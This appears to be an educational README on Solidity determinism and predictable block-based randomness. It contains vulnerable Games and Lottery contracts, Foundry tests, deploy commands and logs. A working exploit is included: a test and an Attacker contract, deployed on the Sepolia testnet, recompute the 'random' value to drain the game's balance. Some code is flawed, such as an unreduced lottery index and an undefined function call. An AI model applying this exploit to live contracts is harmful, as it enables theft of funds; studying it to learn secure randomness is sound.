# Deterministic 
## Smart contracts are deterministic  same input = same output 
- A deterministic smart contract is a contract in which the same inputs always produce the same outputs, no matter when or where the contract is executed. Determinism is crucial in smart contracts to ensure consistency, predictability, and trust across all Ethereum nodes in the network
- Consistency Across Nodes: All Ethereum nodes running the contract reach the same result when processing the same transaction. This is vital for consensus.

![Static Badge](https://img.shields.io/badge/Randomness%20Teat%201%20-Green)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

contract randomnessTest1 {

    function deterministicFunction(uint256 addNumber) public pure returns(uint256) {
        uint256 randomnessNumber;
      return randomnessNumber = addNumber*2;
    }   
}
```

 Script to deploy
 
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {randomnessTest1} from "../src/randomnessTest1.sol";

contract DeployRandomnessTest1 is Script {
    randomnessTest1 public randomnesstest1;

    function setUp() public {}
    function run() public {
        vm.startBroadcast();
        randomnesstest1 = new randomnessTest1();
        vm.stopBroadcast();
    }
}
```

 Test Foundry
 
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import {Test, console} from "forge-std/Test.sol";
import {randomnessTest1} from "../src/randomnessTest1.sol";

contract CounterTest is Test {
    randomnessTest1 public randomnesstest1;
    function setUp() public {
         randomnesstest1 = new randomnessTest1();
    }
    // Test deterministicFunction with a specific input
    function testDeterministicFunction() public view {
        uint256 addNumber = 5;
        uint256 expectedResult = 10;
        assertEq(randomnesstest1.deterministicFunction(addNumber),expectedResult);
    }
    // Test deterministicFunction with a large input
    function testDeterministicFunctionLargeInput() public view {
        uint256 addNumber = type(uint256).max/2;
        uint256 expectedResult = addNumber*2;
        assertEq(randomnesstest1.deterministicFunction(addNumber),expectedResult);        
}
}
```

![Static Badge](https://img.shields.io/badge/Randomness%20Test%202%20-Green)

- This smart contract is called Games and it implements a simple game where a user can guess a "random" number.
 If their guess matches the number generated by the contract, they win the entire contract balance. 
 - A "random" number is generated using:
block.timestamp: The timestamp of the current block.
block.number: The current block number.
block.difficulty: The mining difficulty of the current block.

- These values are combined using the keccak256 hash function, and the result is converted to a uint256.
Problem
-  This approach is not secure for randomness because miners or attackers can predict or manipulate these values.

``` solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

contract Games {
    constructor() payable {}

    function play(uint256 gues) public {
        // Calculate a pseudo-random number
        uint256 random = uint256(keccak256(abi.encodePacked(block.timestamp, block.number, block.difficulty)));

        // If the guess is correct, transfer all the contract's balance to the sender
        if (random == gues) {
            payable(msg.sender).transfer(address(this).balance);
        }
    }
}

```
- Test With Foundry FrameWork
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import {Test, console} from "forge-std/Test.sol";
import {Games} from "../src/Games.sol";

contract CounterTest is Test {
    Games public games;

    address public attacker = address(0x2);

    function setUp() public {
       // Deploy the Games contract with an initial balance 10 ether
        games = new Games{value: 10 ether}();
         console.log("games address: %s", address(games));
    }
    function testPlay() public {
        vm.startPrank(attacker);
       // Ensure the attacker has some Ether to call the play function
        vm.deal(attacker,1 ether);
        // Predict the random value
        uint256 guess = uint256(keccak256(abi.encodePacked(block.timestamp, block.number, block.difficulty)));
        // Call the play function with the predicted value
        games.play(guess);
        // Check if the attacker successfully drained the funds
        assertEq( attacker.balance, 10 ether);
    }   
}
```


- run command ``` forge compile ``` or ``` forge build  ``` to compile contract
- run command ``` forge create <contract path> --rpc-url <rpc url > -- private-key <private key > --value 10ether --broadcast``` to deploy
- run command ``` forge test -vvv ```  test fail WHY?
  
```solidity
Ran 1 test for test/Games.t.sol:CounterTest
[FAIL: assertion failed: 11000000000000000000 != 10000000000000000000] testPlay() (gas: 18818)
Logs:
  games address: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f

Traces:
  [18818] CounterTest::testPlay()
    ├─ [0] VM::startPrank(SHA-256: [0x0000000000000000000000000000000000000002])
    │   └─ ← [Return] 
    ├─ [0] VM::deal(SHA-256: [0x0000000000000000000000000000000000000002], 1000000000000000000 [1e18])
    │   └─ ← [Return] 
    ├─ [7368] Games::play(96758112507123037457144765246511711555223209187725868989644329763805255684767 [9.675e76])
    │   ├─ [60] PRECOMPILES::sha256{value: 10000000000000000000}(0x)
    │   │   └─ ← [Return] 0xe3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
    │   └─ ← [Stop] 
    ├─ [0] VM::assertEq(11000000000000000000 [1.1e19], 10000000000000000000 [1e19]) [staticcall]
    │   └─ ← [Revert] assertion failed: 11000000000000000000 != 10000000000000000000
    └─ ← [Revert] assertion failed: 11000000000000000000 != 10000000000000000000

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 44.34ms (242.05µs CPU time)

Ran 1 test suite in 80.22ms (44.34ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/Games.t.sol:CounterTest
[FAIL: assertion failed: 11000000000000000000 != 10000000000000000000] testPlay() (gas: 18818)

Encountered a total of 1 failing tests, 0 tests succeeded
```
- Why block.difficulty Is Deprecated

   ![Static Badge](https://img.shields.io/badge/Example1-Green)

- Games ``` try to hack ```
  
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

contract Games {
    constructor() payable {}

    function play(uint256 gues) public {

        uint256 random = uint256(keccak256(abi.encodePacked(block.difficulty, block.timestamp, block.number)));
       

        if (random == gues) {
            (bool success, ) = payable(msg.sender).call{value: address(this).balance}("");
            require(success, "Failed to send money");}
    }
}
```
Deploy this contract on sepolia

``` forge create src/Games.sol:Games --rpc-url $RPC_URL_SEPOLIA  --private-key $PRIVATE_KEY_MAHMOUD --value 0.01ether --broadcast ```

OUTPUT

```
[⠃] Compiling...
No files changed, compilation skipped
Deployer: 0x5703A0101Fe9c462d33DE5Dd81a8C6e4fE391D3F
Deployed to: 0x156aeD9f0Cf08Fa0f72E8a06808ffa2817F96A13
Transaction hash: 0xadf2a1dae3134b47cd561fa0a91179d37d4241f4707ed5cf18df2ae588cb7244
```

Contract To Attack

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
interface IGames {
    function play(uint256 gues) external;
}

contract Attacker {
    address public gamesAddress;

    constructor(address _gamesAddress) {
        gamesAddress = _gamesAddress;
    }
    function attack() public payable {
        uint256 random = uint256(keccak256(abi.encodePacked(block.difficulty, block.timestamp, block.number)));        
        IGames(gamesAddress).play(random);
    }

    function withdraw() public {
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}
```
Scripte to deploy attacker contract 
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Attacker.sol";
import "../src/Games.sol";

contract DeployAttacker is Script {
    function run() public {
        // Replace with the actual address of the deployed Games contract
        address gamesAddress = vm.envAddress("GAMES_ADDRESS");

        // Start broadcasting transactions
        vm.broadcast();

        // Deploy the Attacker contract
        Attacker attacker = new Attacker(gamesAddress);

        // Log the address of the deployed Attacker contract
        console.log("Attacker deployed to:", address(attacker));
    }
}
```
Command to deploy script ``` forge script script/DeployAttacker.s.sol:DeployAttacker --rpc-url $RPC_URL_SEPOLIA --private-key $PRIVATE_KEY_AHMED --broadcast -vvv ```
OUTPUT
```
[⠊] Compiling...
No files changed, compilation skipped
Script ran successfully.

== Logs ==
  Attacker deployed to: 0x1732dC14Fc3614FaB3BF99Fe75a3699C261c05cE

## Setting up 1 EVM.

==========================

Chain 11155111

Estimated gas price: 36.56063413 gwei

Estimated total gas used for script: 211783

Estimated amount required: 0.00774292077795379 ETH

==========================

##### sepolia
✅  [Success] Hash: 0xf1d2a175090dfda2dde21555f74b133dc022d58d92242a1385c770bf2d429ccf
Contract Address: 0x1732dC14Fc3614FaB3BF99Fe75a3699C261c05cE
Block: 7492181
Paid: 0.00352813101090813 ETH (162910 gas * 21.656933343 gwei)

✅ Sequence #1 on sepolia | Total Paid: 0.00352813101090813 ETH (162910 gas * avg 21.656933343 gwei)
                                                                                                                                      

==========================

ONCHAIN EXECUTION COMPLETE & SUCCESSFUL.

Transactions saved to: /home/mourad/RandomnessVulnerabilities/games/broadcast/DeployAttacker.s.sol/11155111/run-latest.json

Sensitive values saved to: /home/mourad/RandomnessVulnerabilities/games/cache/DeployAttacker.s.sol/11155111/run-latest.json
```

![Static Badge](https://img.shields.io/badge/Example2-Green)

- Lottery Contract Buy-ticket 
```solidity
 // SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

contract Lottery {

 address public owner;
 address [] public players;

 constructor(){
     owner = msg.sender;
     }


    function buyTicket () public payable{
        require(msg.value == 1 ether ,"You need to send 1 ether");
        players.push(msg.sender);
    }

    function picWinner() public{
        require (msg.sender == owner, "You are not the owner");
        require(players.length > 0 ,"No players in the game");
        uint index = uint (keccak256(abi.encodePacked(block.difficulty,block.timestamp,block.number,msg.sender)));
        address winner = players[index];
        payable(winner).transfer(address(this).balance);
        players = new address[] (0);
    }
}
```
- Script to deploy and broad cast
```solidity 
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Lottery.sol";

contract DeployLottery is Script {

    Lottery public lottery ;

    function run () public{
        vm.startBroadcast();
        lottery = new Lottery();
        console.log("Lottery deployed to:", address(lottery));
        
        vm.stopBroadcast();
    }
    
}
```
- Command Line To Deploy
``` forge script script/DeployLottery.s.sol:DeployLottery --rpc-url http://127.0.0.1:8545 --private-key <PRIVATE KEY> --broadcast ```
- Buy Ticket from another contract 
``` cast send <CONTRACT DEPLOYED ADDRESS> "buyTicket()" --rpc-url http://127.0.0.1:8545 --private-key <PRIVATE KEY> --value 1ether ```
- To Check Balance 
```cast balance < CONTRACT ADDRESS> --rpc-url http://127.0.0.1:8545 ```
- explain "panic: array out-of-bounds access (0x32)" 
- Write script to test Lottery
```solidity


// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/Lottery.sol";

contract TestLottery is Test {

    Lottery public lottery ;

    function setUp() public {
        lottery = new Lottery();
    }

    function testOwner() public view {
        assertEq(lottery.owner(), address(this));
    }

    function testBuyTicket () public{

        address player1 = address(0x1);
        address player2 = address(0x2);
        address player3 = address(0x3);
        vm.deal(player1, 1 ether);
        vm.deal(player2, 1 ether);
        vm.deal(player3, 1 ether);
        vm.prank(player1);  
        lottery.buyTicket{value : 1 ether}();
        assertEq(lottery.players(0), player1);
        vm.stopPrank();
        vm.prank(player2);
        lottery.buyTicket{value : 1 ether}();
        assertEq(lottery.players(1), player2);
        vm.stopPrank();
        vm.prank(player3);
        lottery.buyTicket{value : 1 ether}();
        assertEq(lottery.players(2), player3);  
        vm.stopPrank();
    }

    function testPickWinner() public{
        address player1 = address(0x1);
        address player2 = address(0x2);
        address player3 = address(0x3);

        vm.prank(player1);
        vm.deal(player1, 2 ether);
        lottery.buyTicket{value : 1 ether}();
        vm.prank(player2);
        vm.deal(player2, 2 ether);
        lottery.buyTicket{value : 1 ether}();
        vm.prank(player3);
        vm.deal(player3, 2 ether);
        lottery.buyTicket{value : 1 ether}();
        vm.stopPrank();
        vm.prank(address(this));
        lottery.picWinner();
        assertEq(lottery.getNumberOfPlayers(), 0);
        assertEq(address(lottery).balance,0 ether);
    }
}
```








